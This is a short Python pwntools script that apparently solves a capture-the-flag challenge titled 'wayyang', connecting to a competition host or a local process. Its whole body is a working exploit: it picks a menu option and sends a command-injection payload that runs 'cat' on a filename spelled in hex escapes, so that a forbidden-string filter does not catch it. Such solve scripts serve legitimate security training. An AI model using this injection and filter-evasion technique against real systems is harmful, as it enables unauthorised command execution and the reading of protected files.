#!/usr/bin/env python3
#3-06-2022
#Gon
#Bypass forbidden string

from pwn import *

context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote('fun.chall.seetf.sg', 50008)
    else:
        io = process('./wayyang.py')
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()
io.sendlineafter(b'>> ', b'4')
io.sendlineafter(b'babe', b'\'cat `echo -e "\\x46\\x4c\\x41\\x47"`\'')


io.interactive()
